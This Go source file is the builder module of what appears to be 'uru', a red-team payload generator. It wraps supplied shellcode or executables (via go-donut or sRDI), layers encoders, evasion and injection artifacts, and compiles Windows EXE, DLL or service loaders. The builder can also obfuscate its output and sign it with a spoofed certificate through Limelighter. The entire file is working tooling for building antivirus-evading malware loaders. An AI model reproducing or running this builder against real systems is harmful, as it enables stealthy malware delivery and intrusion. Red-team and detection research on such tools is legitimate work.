package builder

import (
	"os"
	"path"
	"path/filepath"
	"reflect"
	"strconv"
	"strings"
	"text/template"
	"encoding/hex"
	"fmt"

	"github.com/guervild/uru/data"
	"github.com/guervild/uru/pkg/common"
	"github.com/guervild/uru/pkg/compiler"
	"github.com/guervild/uru/pkg/encoder"
	"github.com/guervild/uru/pkg/evasion"
	"github.com/guervild/uru/pkg/injector"
	"github.com/guervild/uru/pkg/logger"
	"github.com/guervild/uru/pkg/models"
	"github.com/guervild/uru/pkg/tampering"

	"gopkg.in/yaml.v3"
)

type Builder struct {
	Type          string
	Args          string
	ShellcodeData string
	ShellcodeLen  string
	Imports       []string
	InstancesCode []string
	FunctionsCode []string
	Debug         bool
	IsDLL         bool
	IsService     bool
	ExportNames   string
	OutDirPath    string
	ServiceName   	   string
	ServiceDisplayName string
	ServiceDescription string
}

type PayloadConfig struct {
	Payload Payload `yaml:"payload,omitempty"`
}

type Artifact struct {
	Name string `yaml:"name,omitempty"`
	Type string `yaml:"type,omitempty"`
	Args []Arg  `yaml:"args,omitempty"`
}

type Arg struct {
	Name  string `yaml:"name,omitempty"`
	Value string `yaml:"value,omitempty"`
}

type LimeLighterArgs struct {
	Domain   string `yaml:"domain"`
	Real     string `yaml:"real"`
	Password string `yaml:"password"`
}

type ServiceOptions struct {
	ServiceName   	   string `yaml:"serviceName"`
	ServiceDisplayName string `yaml:"serviceDisplayName"`
	ServiceDescription string `yaml:"serviceDescription"`
}

type Payload struct {
	Lang               string          `yaml:"lang,omitempty"`
	Arch               string          `yaml:"arch,omitempty"`
	Debug              bool            `yaml:"debug"`
	Type               string          `yaml:"type,omitempty"`
	Sgn                bool            `yaml:"sgn,omitempty"`
	Artifacts          []Artifact      `yaml:"artifacts"`
	Obfuscation        bool            `yaml:"obfuscation"`
	Append             string          `yaml:"append"`
	Prepend            string          `yaml:"prepend"`
	FilePropertiesPath string          `yaml:"file_properties_path"`
	LimeLighterArgs    LimeLighterArgs `yaml:"limelighter"`
	ServiceOptions     ServiceOptions  `yaml:"serviceOptions"`
}

func NewPayloadConfigFromFile(data []byte) (PayloadConfig, error) {

	var p PayloadConfig

	err := yaml.Unmarshal(data, &p)
	if err != nil {
		return p, fmt.Errorf("Error while parsing config file: %v", err)
	}

	return p, nil
}

func (payloadConfig *PayloadConfig) GenerateSupportedPayload(filename string, payload []byte, godonut, srdi, keep bool, parameters, functionName, class string, clearHeader bool) (string, []byte, error) {
	//TODO rework createfilefunc
	//define var that will be use later by generate
	currRandom := common.RandomString(4)
	dataTmpl := data.GetTemplates()

	// Instanciate needed array
	var imports []string
	var instancesCode []string
	var functionsCode []string
	var encodersArray []models.ObjectModel
	var encodersStringArray []string
	var alreadyAddedArtifact []string
	var debug bool
	var serviceName string
	var serviceDisplayName string
	var serviceDescription string
	var binFile string
	var err error
	var artifactList []string

	//create output dir
	tempFileBase := fmt.Sprintf("out_%s", currRandom)
	dirPath, _ := filepath.Abs(path.Join("out", tempFileBase))
	err = common.CreateDir(dirPath)
	if err != nil {
		return "", nil, err
	}

	logger.Logger.Info().Str("output_directory", dirPath).Msg("Create the output directory")

	payloadData := payload

	//Process contents
	arch, err := compiler.GetProperArch(payloadConfig.Payload.Arch, payloadConfig.Payload.Lang)
	if err != nil {
		return "", nil, err
	}

	//Setting extension
	var extension string
	var buildmode string
	isDLL := false
	isService := false

	//TODO clean that for services
	if strings.ToLower(payloadConfig.Payload.Type) == "svc" {
		isService = true
		serviceName = payloadConfig.Payload.ServiceOptions.ServiceName
		serviceDisplayName = payloadConfig.Payload.ServiceOptions.ServiceDisplayName
		serviceDescription = payloadConfig.Payload.ServiceOptions.ServiceDescription
	}
	// create compiler object
	thisCompiler, err := compiler.GetEmptyCompiler(payloadConfig.Payload.Lang)
	if err != nil {
		return "", nil, err
	}

	// get build info for specific compiler, verify config is supported (dll, exe etc.)
	extension, buildmode, err = thisCompiler.IsTypeSupported(payloadConfig.Payload.Type)

	// check if type is supported
	if err != nil {
		return "", nil, err
	}

	// helps with markup based on file exstension
	exportNames := thisCompiler.GetExportNames(extension)

	// set debug flag, append debug imports
	if payloadConfig.Payload.Debug {
		logger.Logger.Info().Msg("Debug is set, adding debug functionality")
		debug = true
		imports = append(imports, thisCompiler.GetDebugImports()...)
	}

	if godonut == true && srdi == true {
		return "", nil, fmt.Errorf("donut and srdi can't be passed together. Choose only one between the two arguments")
	}

	if godonut {
		logger.Logger.Info().Bool("donut", godonut).Msg("Payload is an executable, will use go-donut...")

		shellcode, err := encoder.ConvertToGoDonutShellcode(payloadData, filepath.Ext(filename), class, functionName, parameters)
		if err != nil {
			return "", nil, err
		}

		payloadData = shellcode
	}

	if srdi {
		logger.Logger.Info().Bool("srdi", srdi).Bool("clearHeader", clearHeader).Str("functionName", functionName).Str("parameters", parameters).Msg("Payload will be converted to srdi shellcode")
		payloadData = encoder.ConvertToSRDIShellcode(payloadData, functionName, parameters, clearHeader)
	}

	//[SGN] - DECOMMENT TO USE SGN
	/*
		if payloadConfig.Payload.Sgn {
			logger.Logger.Info().Msg("Will use SGN on provided payload file")
			logger.Logger.Info().Int("size", len(payloadData)).Msg("Payload size before SGN")
			payloadData, err = encoder.DoSGNEncode(payloadConfig.Payload.Arch, payloadData)

			if err != nil {
				return "", nil, fmt.Errorf("Error while SGN encoding", err)
			}

			logger.Logger.Info().Int("size", len(payloadData)).Msg("Payload size after SGN (bytes)")
		}
	*/

	//Prepend
	if payloadConfig.Payload.Prepend != "" {
		logger.Logger.Info().Msgf("Prepend is set")
		logger.Logger.Info().Int("size", len(payloadData)).Msg("Payload size before prepend")

		prepend, err := hex.DecodeString(payloadConfig.Payload.Prepend)
		if err != nil {
			return "", nil, fmt.Errorf("Error while decoding prepend string: %s", err.Error())
		}

		tmpPayloadData := make([]byte, 0)

		tmpPayloadData = append(tmpPayloadData, prepend...)
		tmpPayloadData = append(tmpPayloadData, payloadData...)

		payloadData = tmpPayloadData
		logger.Logger.Info().Int("size", len(payloadData)).Msg("Payload size after prepend")
	}

	//Append
	if payloadConfig.Payload.Append != "" {
		logger.Logger.Info().Msgf("Append is set")
		logger.Logger.Info().Int("size", len(payloadData)).Msg("Payload size before append")
		appendStr, err := hex.DecodeString(payloadConfig.Payload.Append)
		if err != nil {
			return "", nil, fmt.Errorf("Error while decoding append string: %s", err.Error())
		}
		payloadData = append(payloadData, appendStr...)

		logger.Logger.Info().Int("size", len(payloadData)).Msg("Payload size after append")
	}

	for _, v := range payloadConfig.Payload.Artifacts {
		artifactList = append(artifactList, v.Name)

		artifactName := strings.ToLower(v.Name)
		artifactType := strings.ToLower(v.Type)

		logger.Logger.Info().Str("name", artifactName).Msg("Process artifact")

		var artifactValue models.ObjectModel

		if artifactType == "encoder" {
			artifactValue, err = encoder.GetEncoder(strings.ToLower(artifactName), payloadConfig.Payload.Lang)
			if err != nil {
				return "", nil, err
			}
			encodersStringArray = append(encodersStringArray, artifactName)
			encodersArray = append(encodersArray, artifactValue)

		} else if artifactType == "evasion" {
			artifactValue, err = evasion.GetEvasion(strings.ToLower(artifactName), payloadConfig.Payload.Lang)
			if err != nil {
				return "", nil, err
			}
		} else if artifactType == "injector" {
			artifactValue, err = injector.GetInjector(strings.ToLower(artifactName), payloadConfig.Payload.Lang)
			if err != nil {
				return "", nil, err
			}
		} else {
			logger.Logger.Info().Str("name", artifactName).Msg("Artifacts not found!")
			continue
		}

		//Use reflect to modify struct on fly
		if len(v.Args) > 0 {
			for _, a := range v.Args {
				if common.HasField(artifactValue, a.Name) {
					logger.Logger.Info().Str("arg_name", a.Name).Str("arg_value", a.Value).Msg("Try to set artifact argument")
					common.SetField(artifactValue, a.Name, a.Value)
					logger.Logger.Info().Str("arg_name", a.Name).Str("arg_value", string(common.GetField(artifactValue, a.Name))).Msg("Value after setting the argument")
				}
			}
		}

		if debug {
			common.SetDebug(artifactValue, "debug", debug)
		}

		if len(artifactValue.GetImports()) > 0 {
			imports = append(imports, artifactValue.GetImports()...)
		}
		iCode, err := artifactValue.RenderInstanciationCode(dataTmpl)
		if err != nil {
			return "", nil, err
		}

		fCode, err := artifactValue.RenderFunctionCode(dataTmpl)
		if err != nil {
			return "", nil, err
		}

		if len(iCode) > 0 {
			instancesCode = append(instancesCode, iCode)
		}

		// If it is already added, we dont need to add the function code again
		if len(fCode) > 0 && !common.ContainsStringInSliceIgnoreCase(alreadyAddedArtifact, artifactName) {
			functionsCode = append(functionsCode, fCode)
		}

		alreadyAddedArtifact = append(alreadyAddedArtifact, artifactName)
	}

	//Remove duplicate imports
	logger.Logger.Info().Msg("Removing duplicate imports")
	imports = common.RemoveDuplicateStr(imports)

	//Reverse encoding instance order
	logger.Logger.Info().Msg("Will perform encoding...")
	tmpPayloadData := payloadData
	var tmpPayloadDataout []byte

	// for each encoder specified, do encoding of payload
	for i := len(encodersStringArray) - 1; i >= 0; i-- {

		e := encodersStringArray[i]
		artifactValue := encodersArray[i]
		fileEntropyBefore, _ := common.GetFileEntropy(tmpPayloadData)

		logger.Logger.Info().Int("size", len(tmpPayloadData)).Float64("entropy", fileEntropyBefore).Msgf("Payload info before %s", e)

		if err != nil {
			return "", nil, err
		}

		// do the encoding
		methodVal := reflect.ValueOf(artifactValue).MethodByName("Encode")
		if !methodVal.IsValid() {
			logger.Logger.Error().Str("encoder", e).Msg("Could not find 'Encode' method")
			continue
		}

		methodIface := methodVal.Interface()
		method := methodIface.(func(s []byte) ([]byte, error))
		tmpPayloadDataout, err = method(tmpPayloadData)
		if err != nil {
			return "", nil, fmt.Errorf("Error while encoding: %s", err)
		}

		tmpPayloadData = tmpPayloadDataout
		fileEntropyAfter, _ := common.GetFileEntropy(tmpPayloadData)

		logger.Logger.Info().Int("size", len(tmpPayloadData)).Float64("entropy", fileEntropyAfter).Msgf("Payload info after %s", e)
	}

	payloadData = tmpPayloadData

	logger.Logger.Info().Int("size", len(payloadData)).Msg("Payload size after encoding")

	var coreFile string
	coreFile, err = compiler.GetCoreFile(payloadConfig.Payload.Lang)
	if err != nil {
		return "", nil, err
	}

	// create var tBuilder which is the core template
	tBuilder, err := template.ParseFS(dataTmpl, coreFile)
	if err != nil {
		return "", nil, err
	}

	// check if dll for formatting template file
	if buildmode == "c-shared" {
		isDLL = true
	}

	//Build builder struct to pass to the template
	templateData := &Builder{
		ShellcodeData: common.GetLanguageByteArray(payloadData, payloadConfig.Payload.Lang),
		ShellcodeLen:  strconv.Itoa(len(payloadData)),
		Imports:       imports,
		InstancesCode: instancesCode,
		FunctionsCode: functionsCode,
		Debug:         debug,
		IsDLL:         isDLL,
		IsService:          isService,
		ExportNames:   exportNames,
		ServiceName:        serviceName,
		ServiceDisplayName: serviceDisplayName,
		ServiceDescription: serviceDescription,
	}

	// write out to go file
	file, err := common.CreatePayloadFile("", payloadConfig.Payload.Lang, dirPath)
	defer file.Close()
	if err != nil {
		return "", nil, err
	}

	err = tBuilder.Execute(file, templateData)
	if err != nil {
		return "", nil, err
	}

	buildData := compiler.BuildData{
		TargetOs:     "windows",
		Arch:         arch,
		DirPath:      dirPath,
		BuildMode:    buildmode,
		Keep:         true,
		Trimpath:     true,
		Obfuscation:  payloadConfig.Payload.Obfuscation,
		Imports:      imports,
		ArtifactList: artifactList,
		DataTemplate: dataTmpl,
		FileProps:    payloadConfig.Payload.FilePropertiesPath,
	}

	// universal compilation
	logger.Logger.Info().Str("filename", file.Name()).Msgf("Compiling ...\n")
	//compile
	err = thisCompiler.PrepareBuild(buildData)
	if err != nil {
		return "", nil, err
	}
	srcFilePath, _ := filepath.Abs(file.Name())

	//if payloadConfig.Payload.OutFileName == "" {
		// keep random bin file name, add out extension
		binFile, _ = filepath.Abs(fmt.Sprintf("%s.%s", common.RemoveExt(file.Name()), extension))
	//} else {
	//	// get out file path, strip the random name, add the user specified name and extsenion
	//	binFile, _ = filepath.Abs(fmt.Sprintf("%s/%s.%s", filepath.Dir(file.Name()), payloadConfig.Payload.OutFileName, extension))
	//}

	// build, report errors
	_, err = thisCompiler.Build(srcFilePath, binFile)
	if err != nil {
		return "", nil, err
	}
	
	// compute hashes
	fileContent, err := os.ReadFile(binFile)
	if err != nil {
		return "", nil, err
	}

	logger.Logger.Info().Str("md5", common.GetMD5Hash(fileContent)).Msg("Get MD5 hash of the payload")
	logger.Logger.Info().Str("sha1", common.GetSHA1Hash(fileContent)).Msg("Get SHA1 hash of the payload")
	logger.Logger.Info().Str("sha256", common.GetSHA256Hash(fileContent)).Msg("Get SHA256 hash of the payload")

	//Signing
	if (payloadConfig.Payload.LimeLighterArgs != LimeLighterArgs{}) {
		logger.Logger.Info().Str("file_to_sign", binFile).Msg("Using Limelighter by @Tyl0us")
		fSigned, _ := filepath.Abs(fmt.Sprintf("%s_signed.%s", common.RemoveExt(binFile), extension))

		errLimeLighter := tampering.Limelighter(binFile, fSigned, payloadConfig.Payload.LimeLighterArgs.Domain, payloadConfig.Payload.LimeLighterArgs.Password, payloadConfig.Payload.LimeLighterArgs.Real, "")

		if errLimeLighter != nil {
			logger.Logger.Info().Msgf("Error while using limelighter to sign the payload: %s\n", errLimeLighter)
		} else {
			logger.Logger.Info().Msgf("Signed File Created: %s", fSigned)
			binFile = fSigned

			fileContent, err := os.ReadFile(binFile)
			if err != nil {
				return "", nil, err
			}

			logger.Logger.Info().Str("md5", common.GetMD5Hash(fileContent)).Msg("Get MD5 hash of the signed payload")
			logger.Logger.Info().Str("sha1", common.GetSHA1Hash(fileContent)).Msg("Get SHA1 hash of the signed payload")
			logger.Logger.Info().Str("sha256", common.GetSHA256Hash(fileContent)).Msg("Get SHA256 hash of the signed payload")
		}
	}

	return binFile, nil, nil
}

func (payloadConfig *PayloadConfig) GeneratePayload(filename string, payload []byte, godonut, srdi, keep bool,
	parameters, functionName, class string, clearHeader bool) (string, []byte, error) {

	if compiler.GetSupportedLangs(payloadConfig.Payload.Lang) {
		return payloadConfig.GenerateSupportedPayload(filename, payload, godonut, srdi, keep, parameters, functionName,
			class, clearHeader)
	}
	return "", nil, fmt.Errorf("Unsupported \"lang\" type")
}
